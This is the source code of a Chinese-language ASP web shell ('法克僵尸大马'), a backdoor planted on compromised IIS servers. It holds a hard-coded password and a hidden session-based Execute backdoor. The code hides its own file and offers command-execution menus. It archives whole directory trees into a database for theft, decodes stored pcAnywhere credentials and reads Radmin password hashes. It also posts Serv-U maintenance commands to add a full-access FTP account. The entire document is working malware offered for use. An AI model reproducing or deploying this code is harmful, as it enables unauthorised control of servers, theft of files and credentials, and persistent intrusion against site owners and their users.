<%
UserPass="admin"  '密码
'--------------------------------------------------------------------
mNametitle ="法克僵尸大马"  ' 标题
Copyright="sb"  '版权
SItEuRl="http://www.7jyewu.cn/" '你的网站
bg ="http://www.7jyewu.cn/shell/akill.jpg"  '背景图片,不使用留空
ysjb=true  '是否有拖动效果,true为是,false为否
'增加PR查询功能，增加删除带点文件夹
'美化程序,优化代码.
'借用双刀图片，如果想要改图片请自行修改地址
'--------------------------------------------------------------------
Server.ScriptTimeout=999999999
Response.Buffer =true
BodyColor="#000000"
FontColor="#b4a9a9"
LinkColor="#ffffff"
On Error Resume Next 
strBAD="If Request(""#"")<>"""" Then Session(""#"")=Request(""#"")"&VbNewLine
strBAD=strBAD&"If Session(""#"")<>"""" Then Execute(Session(""#""))"
Const DEfd=""
sub ShowErr()
 If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
sub RaPath(s)
RaPath=ExecuteGlobal(s)
End sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ScriptPath=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"
FolderPath=Request("FolderPath")
u=request.servervariables("http_host")&url
domain=Request.ServerVariables("http_host")
url=request.servervariables("url")
uu=request.servervariables("http_host")&url
pp=userpass
FName=Request("FName")
cdx="<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#191919'"">":cxd="<font face='wingdings'>8</font>":ef="</a></td></tr>"
set fso=server.CreateObject(CONST_FSO)
set fsoX=server.CreateObject(CONST_FSO)
str1="http://"&Request.ServerVariables("SERVER_Name")& left(Request.ServerVariables("URL"),InstrRev(Request.ServerVariable("URL"),"/"))
BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
j "<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&mNametitle&" - "&ServerIP&" </title><style type=""text/css"">span.underline{text-decoration:underline;}span.orange{color:#B3D169;}span.project_type{text-align:right}span.grey{color:#666;}#links{list-style-type:none;padding:20px 0 0 0;padding-left:20px;}#linklist2  td{color:#fff;background:#191919;}#linklist2 td:visited{color:#999;}#linklist2 td:hover{background:#B3D169;color:#191919;}body,tr,td{margin-top: 5px;background-color: #000000;color: #b4a9a9;font-size: 12px;SCROLLBAR-FACE-COLOR: #232323;scrollbar-arrow-color: #383839;scrollbar-highlight-color: #383839;scrollbar-3dlight-color: #dddddd;scrollbar-shadow-color: #232323}.sb{cursor: hand}input,select,textarea{border-top-width: 1px;font-weight: bold;border-left-width: 1px;font-size: 11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #121212;padding-left: 5px;padding-right: 5px;font-color: #fff}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size: 13px}a{color: #ffffff;text-decoration: none;}.am{color: #b4a9a9;font-size: 11px;}</style>"
j"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>"
j"<body" :If Action="" then j " scroll=no":j ">"
Dim ObT(18,2):Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件,显示'<font color=red>×</font>'时用<a href='?Action=cmdx' target='FileFrame'> <font color=red> 执行Cmd二</font></a> 此功能执行":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件"
ObT(14,0) = "ws"&"cript.shell.1":  OBt(14,2) = "如果wsh被禁，可以改用这个组件":OBT(15,0) = "WS"&"CRIPT.NETWORK":  OBt(15,2) = "查看服务器信息的组件，有时可以用来提权":OBT(16,0) = "she"&"ll.appl"&"ication":OBt(16,2) = "she"&"ll.appli"&"cation 操作，无FSO时操作文件以及执行命令":OBT(17,0) = "sh"&"ell.appl"&"ication.1":OBt(17,2) = "she"&"ll.appli"&"cation 的别名，无FSO时操作文件以及执行命令":OBT(18,0) = "Shell.Users":OBt(18,2) = "删除了net.exe net1.exe的情况下添加用户的组件"
For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if
Function PcAnywhere4()
j"<div align='center'>PcAnywhere提权 Bin版本</div><form name='xform' method='post'><table width='80%'border='0'><tr><td width='10%'>cif文件: </td><td width='10%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td><td><input type='submit' value=' 提交 '></td></table>"
end Function

j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"




Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
 j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
 j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
 j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
 j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
 j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
 j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
 j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
 j = j * 16 
Next 
result = result + j 
Next 
hexdec = result 
End Function 
sub promyself()
On Error Resume Next 
set f=fso.GetFile(ScriptPath)
if f.Attributes <> 39 and session("lock")="" then
f.Attributes=1+2+4+32
end if
set f=nothing
end sub
promyself
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2 
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next 
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
j"Pcanywhere Reader ==><br><br>PATH:"&CIF&"<br>帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
j"<br>密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
j"<br>注意:读出HASH值后用RadminHash工具或od调试连接，工具下载地址:"&htp&"soft/Radmin_hash.rar<br><br>"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
j Parameter&":"
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If  Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If 
Next
j strobj
Else
j"Error! Can't Read!"
End If
j"<br><br>"
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then 
j Port &":" 
j hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else 
j"Error! Can't Read!"
End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function

Function MainForm()
j "<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame""><input type=""hidden"" name=""Action""><input type=""hidden"" name=""FName""></form><table width='100%'><form name='addrform' method='post' action='"&URL&"' target='_parent'><tr><td width='60' align='center'><input type='button' value='Address'></td><td><input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'></td><td width='140' align='center'><input name='Submit' type='submit' value='GO'> <input type='submit' value='Refresh' onclick='FileFrame.location.reload()'></td></tr></form></table>"
j"<td><a class=am href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a class=am href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a class=am href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】<a><a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a class=am href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】<a><a class=am href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】<a><a class=am href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】<a>":j"<br><a class=am href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a class=am href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>&nbsp;&nbsp;(2)【TEMP】<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a  class=am href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>&nbsp;<a class=am href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a  class=am href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a class=am href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>   <a class=am href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>":j"</td>"
j "<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'><td width='160' id=tl><iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td><td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隐藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>显示</b></a></p></td><td width=1 style='background:#424242'><td><iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe></tr></form></table></td></tr><tr></tr></table>"
if session("aase") <> "ok" then:response.write Efun:session("aase")="ok":end if
End Function
Sub PageAddToMdb()
Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
j "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
j "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
j"<br>文件夹打包:<form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80><input type=hidden value=addToMdb name=theAct><select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option></select><input type=submit value='开始打包'><br><br>注: 打包生成HSH.mdb文件,位于sam木马同级目录下</form><hr/>文件包解开(需FSO支持):<br/><form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80><input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'><br><br>注: 解开来的所有文件都位于本程序目录下</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject(CONST_FSO).FolderExists(thePath) = False Then
showErr(thePath & " 目录不存在或者不允许访问!")
End If
Set theFolder = Server.CreateObject(CONST_FSO).GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(CONST_FSO).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Dim Filepaths
set Filepaths=new SearchFile
Filepaths.Class_Folder Filename
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(CONST_FSO).FolderExists(Left(thePath, i)) = False Then
Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function ProFile()
If Request("Action2")="Post" Then
Randomize
dim pass2,num1
pass2=""
Do While Len(pass2)<8
if Len(pass2)<=4 then
num1=CStr(Chr((122-97)*rnd+97)) 'a~z 
else
num1=CStr(Chr((57-48)*rnd+48)) '0~9 
end if
pass2=pass2&num1
loop 
pass2=ucase(pass2)
Application(pass2)=1
Application(pass2&"File")=request("AFile")
Application(pass2&"Code")=request("ACode")
Application(pass2&"Time")=request("ATime")
Application(pass2&"Char")=request("AChar")
j"<br><br><br><center>保护进程 <font color=yellow>"&pass2&"</font> 生成成功！点击<a style=""text-decoration:underline;font-weight:bold"" href="&URL&"?ProFile="&pass2&" target=_blank>这里</a>启动进程。</center><br>"
Response.End
End If
SI="<br><table border='0' cellpadding='0' cellspacing='0'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=ProFile&Action2=Post'"
SI=SI&"<tr><td valign=top style='line-height:22px' align=right><input type=""hidden"" name=""vvva"" value=""0"">需要保护的文件路径：<br><font color=yellow>可同时保护多个文件&nbsp;&nbsp;<br>每行一个文件路径&nbsp;&nbsp;</font></td><td>"
SI=SI&"<textarea name=""AFile"" cols=""70"" rows=""7"">"&RRePath(Session("FolderPath")&"\test.asp")&"</textarea></td></tr>"
SI=SI&"<tr><td valign=top style=""padding-top:3px;"" align=right>文件代码：</td><td><textarea name=""ACode"" cols=""70"" rows=""7"">文件代码</textarea></td></tr>"
SI=SI&"<tr><td align=right>文件编码：</td><td><input type=""radio"" name=""AChar"" value=""1"" checked />GB2312  <input type=""radio"" name=""AChar"" value=""2"" />UTF-8 (访问文件若出现乱码，请尝试更改编码)</td></tr>"
SI=SI&"<tr><td align=right>保护频率：</td><td><input type=""text"" name=""ATime"" style=""text-align:right"" value=""1"" size=""5"" onkeyup=""value=value.replace(/[^\d]/g,'')"" /> 秒 (最小为1秒，需要保护的文件越多，频率设置越大，否则无法全部保护)</td></tr>"
SI=SI&"<tr><td>&nbsp;</td><td height=50><input type='submit' name='Submit' value='下一步，生成保护进程'></td></tr>"
SI=SI&"</form></table>"
j SI
End Function
Function suftp()
j"<center><br><form name='form1' method='post' action=''><table width='500'><tr align='center' valign='middle'><td colspan='2' id=s><font face=webdings>8</font> <B>集成版本信息</b></td></tr><tr align='center'><td id=d>系统账号：</td><td id=d><input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'></td></tr><tr align='center'><td id=d>系统口令：</td><td id=d><input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'></td></tr><tr align='center'><td id=d>系统端口：</td><td id=d><input name='dport' type='text' class='TextBox' id='dport' value='43958'></td></tr><tr align='center'><td id=d>新加账号：</td><td id=d><input name='tuser' type='text' class='TextBox' id='tuser' value='invader'></td></tr><tr align='center'><td id=d>新加口令：</td><td id=d><input name='tpass' type='text' class='TextBox' id='pass' value='1'></td></tr><tr align='center'><td id=d>访问路径：</td><td id=d><input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'></td></tr><tr align='center'><td id=d>服务端口：</td><td id=d><input name='tport' type='text' class='TextBox' id='tport' value='21'></td></tr><tr align='center'><td id=d>执行任务：</td><td id=d><input name='radiobutton' type='radio' value='add' checked class='TextBox' id=d>确定添加&nbsp;<input type='radio' name='radiobutton' value='del' class='TextBox' id=d>确定删除</td></tr><tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='Just Go'>&nbsp;<input type='reset' name='Submit2' value='Reset'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
j ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function
Function MainMenu()
j"<script language=javascript>function MM_show(s){if (document.getElementById(s).style.display==""""){document.getElementById(s).style.display=""none"";}else{document.getElementById(s).style.display="""";}}</script><table width='100%' cellspacing='0' cellpadding='0'><tr><td height='5'></td></tr><tr><td><center><font color=pink><font size=1.0>"&mName&"</font></font></center><hr color=#424242 size=1 ></td></tr>":If ObT(0,1)=" ×" Then
j"<tr><td height='24'>无权限</td></tr>"
Else
j"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='Disk & Files'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menud style=""display='none'"">"
Set ABC=New LBF:j ABC.ShowDriver():Set ABC=Nothing
j"</table></td></tr><tr><td valign=""top"" align=center><table border=0><tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#121212'""><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><font face='wingdings'>8</font> 站点根目录"&ef
j cdx&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&cxd&" 本程序目錄"&ef
j cdx&"<a href='?Action=goback' target='FileFrame'>"&cxd&" 回上级目录"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>"&cxd&" 新建--目錄"&ef
j cdx&"<a href='?Action=EditFile' target='FileFrame'>"&cxd&" 新建--文本"&ef
j cdx&"<a href='?Action=UpFile' target='FileFrame'>"&cxd&" 上传--文件"&ef
j cdx&"<a href='?Action=Cmd1Shell' target='FileFrame'>"&cxd&" 执行---CMD"&ef
j cdx&"<a href='?Action=cmdx' target='FileFrame'>"&cxd&" 执行--CMD2"&ef
j cdx&"<a href='?Action=ScanDriveForm' target='FileFrame'>"&cxd&" 磁盘--权限"&ef
j cdx&"<a href='?Action=CustomScanDriveForm' target='FileFrame'>"&cxd&"  <font color=red>可写--目录</font>"&ef
j cdx&"<a href='?Action=php' target='FileFrame'>"&cxd&" 脚本--探测"&ef
j cdx&"<a href='?Action=PageAddToMdb' target='FileFrame'>"&cxd&" 服务器打包"&ef
j cdx&"<a href='?Action=upload' target='FileFrame'>"&cxd&" 下载--文件"&ef&"</table><hr></td></tr>"
End If
j"</tr><tr><td height=4></td></tr><tr><td onClick=""MM_show('menuc')""><input onMouseOver=""this.style.cursor='hand1'"" type=button value='Information'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menuc style=""display=''"">"
j cdx&"<a href='?Action=Course' target='FileFrame'>"&cxd&" 用户__账号"&ef
j cdx&"<a href='?Action=getTerminalInfo' target='FileFrame'>"&cxd&" 端口__网络"&ef
j cdx&"<a href='?Action=Alexa' target='FileFrame'>"&cxd&" 组件__支持"&ef
j cdx&"<a href='?Action=Servu' target='FileFrame'>"&cxd&" Servu-提权"&ef
j cdx&"<a href='?Action=suftp' target='FileFrame'>"&cxd&" Su---FTP版"&ef
j cdx&"<a href='?Action=MMD' target='FileFrame'>"&cxd&" SQL-----SA"&ef
j cdx&"<a href='?Action=radmin' target='FileFrame'>"&cxd&" Radmin提权"&ef
j cdx&"<a href='?Action=pcanywhere4' target='FileFrame'>"&cxd&" Pcanywhere"&ef
j cdx&"<a href='?Action=ScanPort' target='FileFrame'>"&cxd&" 端口扫描器"&ef
j cdx&"<a href='?Action=ReadREG' target='FileFrame'>"&cxd&" 读取注册表"&ef
j cdx&"<a href='?Action=TSearch' target='FileFrame'>"&cxd&" 搜索__文件"&ef&"</tr></table>"
j"<hr><tr><td><input onMouseOver=""this.style.cursor='hand'"" type=button value='   Special     '></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
j cdx&"<a href='?Action=EditPower&PowerPath=\\.\"&ScriptPath&"' target='FileFrame'>"&cxd&" 解锁本程序"&ef
j cdx&"<a href='?Action=hiddenshell' target='FileFrame'>"&cxd&" <font color=red>不死马测试</font>"&ef
j cdx&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\vti_cnf..\\")&""",""NewFolder"")'>"&cxd&"  <font color=red>建带点目录</font>"&ef
